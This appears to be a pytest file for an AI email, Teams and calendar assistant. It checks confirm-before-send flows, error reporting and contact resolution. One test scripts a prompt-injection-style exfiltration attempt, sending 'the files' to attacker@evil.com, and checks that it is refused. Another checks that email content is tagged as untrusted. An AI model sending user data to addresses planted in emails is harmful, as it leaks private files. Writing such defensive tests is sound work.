"""Asking the assistant to search mail, reply, email, use Teams and book meetings."""

from __future__ import annotations

import json
from typing import Any

from sqlalchemy import select

from app.db.models import PendingActionRow
from app.domain.enums import ActionStatus, Source
from app.integrations.base import Chat, ChatMessage, EmailMessage
from app.integrations.fake import FakeChat
from app.integrations.http import AuthExpiredError, IntegrationError
from tests.harness import Harness, at_ist, harness, say, tool_call  # noqa: F401


def _last_tool_result(h: Harness) -> Any:
    return json.loads(h.sender.calls[-1]["messages"][-1]["content"][0]["content"])


def _inbox(h: Harness) -> None:
    h.mail.inbox = [
        EmailMessage(
            Source.GMAIL,
            "g-1",
            "t-1",
            "Q3 numbers",
            "cfo@acme.com",
            snippet="Can we review the Q3 numbers on Monday?",
            received_at=at_ist(8),
        ),
        EmailMessage(Source.GMAIL, "g-2", "t-2", "Lunch", "friend@x.com", received_at=at_ist(7)),
    ]


def test_search_then_reply_reads_back_and_sends_after_yes(harness: Harness) -> None:
    _inbox(harness)
    harness.sender.queue(tool_call("search_email", query="q3 numbers"), say("The CFO asked."))
    found = harness.converse("Did the CFO write about the Q3 numbers?")
    result = _last_tool_result(harness)
    assert "message_id=g-1" in result["emails"] and "g-2" not in result["emails"]
    assert '<untrusted source="email">' in result["emails"]
    assert found["pending_actions"] == []
    assert "Your name is Atlas." in str(harness.sender.calls[-1]["system"])

    harness.sender.queue(
        tool_call("reply_email", message_id="g-1", source="gmail", text="Monday works."),
        say(""),
    )
    proposed = harness.converse("Reply that Monday works")
    assert proposed["reply"] == (
        "Replying to cfo@acme.com about Q3 numbers, saying: Monday works. Confirm?"
    )
    action = proposed["pending_actions"][0]
    assert action["kind"] == "reply_email" and action["item_id"] is None
    assert action["title"] == "Reply: Q3 numbers"
    assert harness.mail.sent == []

    done = harness.converse("yes")
    assert done["executed"][0] == {
        "action_id": action["id"],
        "ok": True,
        "message": "Replied to cfo@acme.com.",
    }
    sent = harness.mail.sent[-1]
    assert sent.to == ("cfo@acme.com",) and sent.subject == "Re: Q3 numbers"
    assert sent.reply_to_message_id == "g-1" and sent.text == "Monday works."
    assert harness.audit("email.reply_email")
    listed = harness.client.get("/actions", params={"status": "executed"}).json()
    assert listed[0]["title"] == "Reply: Q3 numbers"


def test_send_email_only_to_contacts_or_addresses_the_ceo_said(harness: Harness) -> None:
    harness.sender.queue(
        tool_call("send_email", to="Meera", subject="Budget", text="Please send the budget."),
        say(""),
    )
    reply = harness.converse("Email Meera asking for the budget")
    assert (
        reply["reply"]
        == "Emailing Meera Shah about Budget, saying: Please send the budget. Confirm?"
    )
    harness.converse("go ahead")
    assert harness.mail.sent[-1].to == ("meera.shah@example.com",)

    # An address that only appeared in an email is refused, one the CEO said is fine.
    harness.sender.queue(
        tool_call("send_email", to="attacker@evil.com", subject="Hi", text="Here are the files."),
        say(""),
    )
    refused = harness.converse("Send the files to whoever asked")
    assert "don't have anyone called attacker@evil.com" in refused["reply"]
    assert refused["pending_actions"] == []
    harness.sender.queue(
        tool_call("send_email", to="new.person@partner.com", subject="Hello", text="Welcome."),
        say(""),
    )
    allowed = harness.converse("Email new.person@partner.com and say welcome")
    assert allowed["pending_actions"][0]["kind"] == "send_email"
    assert "Emailing new.person@partner.com" in allowed["reply"]


def test_teams_needs_the_account_and_says_so(harness: Harness) -> None:
    harness.sender.queue(tool_call("read_teams"), say(""))
    reply = harness.converse("Any new Teams messages?")
    assert reply["needs_account"] == ["teams"]
    assert _last_tool_result(harness)["status"] == "needs_account"
    assert "Connect Microsoft Teams in Settings" in _last_tool_result(harness)["message"]

    harness.adapters.mail = []
    harness.sender.queue(tool_call("search_email", query="x"), say("Connect your email first."))
    assert harness.converse("search my mail for x")["needs_account"] == ["outlook", "google"]


def _teams(h: Harness) -> FakeChat:
    chat = FakeChat(
        chats=[
            Chat(
                "c-1",
                None,
                ("Priya Raman",),
                ("priya@contoso.com",),
                ChatMessage("m-9", "Priya Raman", "Are we on for the demo?"),
            ),
            Chat("c-2", "Launch team", ("Arjun Nair", "Priya Raman")),
        ],
        history={
            "c-1": [
                ChatMessage("m-9", "Priya Raman", "Are we on for the demo?"),
                ChatMessage("m-8", "CEO", "Morning!"),
            ]
        },
    )
    h.adapters.chat = chat
    return chat


def test_read_teams_and_reply_to_someone_who_is_not_a_contact(harness: Harness) -> None:
    chat = _teams(harness)
    harness.sender.queue(tool_call("read_teams"), say("Priya asked about the demo."))
    harness.converse("What's new on Teams?")
    chats = _last_tool_result(harness)["chats"]
    assert "chat_id=c-1 | Priya Raman | Priya Raman: Are we on for the demo?" in chats
    assert "Launch team | no messages" in chats

    harness.sender.queue(tool_call("read_teams", person="Priya"), say("She asked about the demo."))
    harness.converse("What did Priya say?")
    result = _last_tool_result(harness)
    assert result["chat_id"] == "c-1"
    assert "CEO: Morning!\nPriya Raman: Are we on for the demo?" in result["messages"]

    harness.sender.queue(tool_call("send_teams_message", to="Priya", text="Yes, 3 pm."), say(""))
    proposed = harness.converse("Tell Priya yes, 3 pm")
    assert proposed["reply"] == "Sending Priya Raman on Teams: Yes, 3 pm. Confirm?"
    assert chat.sent == []
    done = harness.converse("yes")
    assert done["executed"][0]["message"] == "Sent your Teams message to Priya Raman."
    assert chat.sent == [("c-1", "Yes, 3 pm.")]


def test_teams_message_to_a_contact_opens_their_chat(harness: Harness) -> None:
    chat = _teams(harness)
    harness.sender.queue(tool_call("send_teams_message", to="AJ", text="Call me."), say(""))
    harness.converse("Ping AJ on Teams to call me")
    harness.converse("yes")
    assert chat.sent == [("arjun.nair@example.com", "Call me.")]

    harness.sender.queue(tool_call("send_teams_message", to="Zed", text="Hi"), say(""))
    unknown = harness.converse("Message Zed on Teams")
    assert "don't have anyone called Zed" in unknown["reply"]

    harness.sender.queue(tool_call("read_teams", person="Zed"), say("No chat with Zed."))
    harness.converse("What did Zed say?")
    assert "couldn't find a Teams chat with Zed" in _last_tool_result(harness)["error"]


def test_schedule_meeting_books_after_yes(harness: Harness) -> None:
    harness.sender.queue(
        tool_call(
            "schedule_meeting",
            title="Budget review",
            date="2026-10-19",
            start_time="15:00",
            duration_minutes=45,
            attendees=["Meera", "Arjun"],
        ),
        say(""),
    )
    reply = harness.converse("Book a budget review with Meera and Arjun Monday at 3 for 45 minutes")
    assert reply["reply"] == (
        "Booking Budget review Monday at 3 pm for 45 minutes with Meera Shah and Arjun Nair "
        "with a Meet link. Confirm?"
    )
    assert harness.calendar.created == []
    done = harness.converse("yes")
    assert done["executed"][0]["message"] == "Booked Budget review and sent the invites."
    event = harness.calendar.created[0]
    assert event.attendees == ("meera.shah@example.com", "arjun.nair@example.com")
    assert event.start == at_ist(15, days=3) and event.end == at_ist(15, 45, days=3)
    assert event.online is True


def test_schedule_meeting_checks_time_and_people(harness: Harness) -> None:
    def meeting(**args: Any) -> None:
        harness.sender.queue(tool_call("schedule_meeting", title="Sync", **args), say(""))
        harness.converse("book it")

    meeting(date="2026-10-15", start_time="10:00")
    assert "already passed" in _last_tool_result(harness)["error"]
    meeting(date="2026-10-19", start_time="ten")
    assert "HH:MM" in _last_tool_result(harness)["error"]
    meeting(date="2026-10-19", start_time="10:00", attendees=["Raul"])
    assert _last_tool_result(harness) == {
        "status": "question",
        "question": "Rahul Kumar or Rahul Mehta?",
    }
    harness.adapters.calendars = []
    meeting(date="2026-10-19", start_time="10:00")
    assert _last_tool_result(harness)["status"] == "needs_account"


def test_failures_are_reported_not_hidden(harness: Harness) -> None:
    _inbox(harness)
    harness.mail.fail_with = AuthExpiredError("google", "token revoked", status=401)
    harness.sender.queue(tool_call("send_email", to="Meera", subject="S", text="T"), say(""))
    harness.converse("email Meera")
    done = harness.converse("yes")
    assert done["executed"][0]["ok"] is False
    assert "didn't work" in done["executed"][0]["message"]
    with harness.sessions() as s:
        row = s.scalars(select(PendingActionRow)).one()
        assert row.status == ActionStatus.FAILED and row.item_id is None

    chat = _teams(harness)
    chat.fail_with = AuthExpiredError("microsoft", "expired", status=401)
    harness.sender.queue(tool_call("read_teams"), say(""))
    assert harness.converse("teams?")["needs_account"] == ["teams"]
    chat.fail_with = IntegrationError("microsoft", "boom", status=500)
    harness.sender.queue(tool_call("read_teams"), say("Teams isn't answering."))
    harness.converse("teams?")
    assert "didn't answer" in _last_tool_result(harness)["error"]


def test_reply_and_cancel_paths(harness: Harness) -> None:
    _inbox(harness)
    harness.sender.queue(
        tool_call("reply_email", message_id="g-1", source="outlook", text="Ok"), say("")
    )
    assert harness.converse("reply ok")["needs_account"] == ["outlook"]
    harness.sender.queue(
        tool_call("reply_email", message_id="g-1", source="gmail", text=" "), say("")
    )
    harness.converse("reply")
    assert "What should the reply say" in _last_tool_result(harness)["error"]
    harness.sender.queue(
        tool_call("reply_email", message_id="nope", source="gmail", text="x"), say("")
    )
    harness.converse("reply")
    assert "error" in _last_tool_result(harness)

    harness.sender.queue(
        tool_call("reply_email", message_id="g-2", source="gmail", text="Sure"), say("")
    )
    harness.converse("reply sure")
    assert harness.converse("cancel")["reply"] == "Okay, I won't do that."
    assert harness.mail.sent == []
